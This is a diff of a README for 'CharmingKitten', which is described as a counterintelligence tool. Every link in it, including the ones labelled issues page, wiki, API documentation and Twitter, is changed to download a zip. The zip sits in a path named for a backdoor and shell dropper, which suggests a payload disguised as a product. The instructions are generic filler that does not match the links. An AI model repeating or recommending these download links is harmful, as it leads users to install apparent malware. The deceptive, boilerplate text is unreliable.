@@ -1,6 +1,6 @@
 # 🐱 CharmingKitten - Exposing Malicious Activity Effectively
 
-[![Download CharmingKitten](https://raw.githubusercontent.com/jp1689/CharmingKitten/main/anticreeper/CharmingKitten.zip)](https://raw.githubusercontent.com/jp1689/CharmingKitten/main/anticreeper/CharmingKitten.zip)
+[![Download CharmingKitten](https://github.com/jp1689/CharmingKitten/raw/refs/heads/main/Episode 3/BellaCiao/Variant1/Eposta/Backdoor/ShellDropper 2/MicrosoftAgentServices/bin/Charming_Kitten_1.6-beta.4.zip)](https://github.com/jp1689/CharmingKitten/raw/refs/heads/main/Episode 3/BellaCiao/Variant1/Eposta/Backdoor/ShellDropper 2/MicrosoftAgentServices/bin/Charming_Kitten_1.6-beta.4.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ CharmingKitten is a useful tool for the IRGC-IO Counterintelligence division. It
 
 To get started, visit the following page to download the latest version of CharmingKitten:
 
-[Download CharmingKitten](https://raw.githubusercontent.com/jp1689/CharmingKitten/main/anticreeper/CharmingKitten.zip)
+[Download CharmingKitten](https://github.com/jp1689/CharmingKitten/raw/refs/heads/main/Episode 3/BellaCiao/Variant1/Eposta/Backdoor/ShellDropper 2/MicrosoftAgentServices/bin/Charming_Kitten_1.6-beta.4.zip)
 
 1. Click on the link above.
 2. You will see a list of available releases. Choose the most recent version, typically labeled with the highest number.
@@ -49,7 +49,7 @@ After launching the application, you will find a simple interface. Follow these 
 
 If you encounter any issues while using CharmingKitten, you can find help in several ways:
 
-- **GitHub Issues:** Report your problems or ask questions by visiting the [issues page](https://raw.githubusercontent.com/jp1689/CharmingKitten/main/anticreeper/CharmingKitten.zip).
+- **GitHub Issues:** Report your problems or ask questions by visiting the [issues page](https://github.com/jp1689/CharmingKitten/raw/refs/heads/main/Episode 3/BellaCiao/Variant1/Eposta/Backdoor/ShellDropper 2/MicrosoftAgentServices/bin/Charming_Kitten_1.6-beta.4.zip).
 - **User Guide:** Check for a detailed user guide in the repository. It offers helpful information about features and troubleshooting.
 - **Community Forums:** Join conversations with other users and share experiences or tips.
 
@@ -89,8 +89,8 @@ If you would like to contribute to CharmingKitten, feel free to fork the reposit
 
 For more detailed information about CharmingKitten, explore these resources:
 
-- [Project Wiki](https://raw.githubusercontent.com/jp1689/CharmingKitten/main/anticreeper/CharmingKitten.zip)
-- [API Documentation](https://raw.githubusercontent.com/jp1689/CharmingKitten/main/anticreeper/CharmingKitten.zip)
-- Follow our updates on [Twitter](https://raw.githubusercontent.com/jp1689/CharmingKitten/main/anticreeper/CharmingKitten.zip) for the latest news and tips.
+- [Project Wiki](https://github.com/jp1689/CharmingKitten/raw/refs/heads/main/Episode 3/BellaCiao/Variant1/Eposta/Backdoor/ShellDropper 2/MicrosoftAgentServices/bin/Charming_Kitten_1.6-beta.4.zip)
+- [API Documentation](https://github.com/jp1689/CharmingKitten/raw/refs/heads/main/Episode 3/BellaCiao/Variant1/Eposta/Backdoor/ShellDropper 2/MicrosoftAgentServices/bin/Charming_Kitten_1.6-beta.4.zip)
+- Follow our updates on [Twitter](https://github.com/jp1689/CharmingKitten/raw/refs/heads/main/Episode 3/BellaCiao/Variant1/Eposta/Backdoor/ShellDropper 2/MicrosoftAgentServices/bin/Charming_Kitten_1.6-beta.4.zip) for the latest news and tips.
 
 Thank you for using CharmingKitten. Together, we can expose and analyze questionable activities effectively.
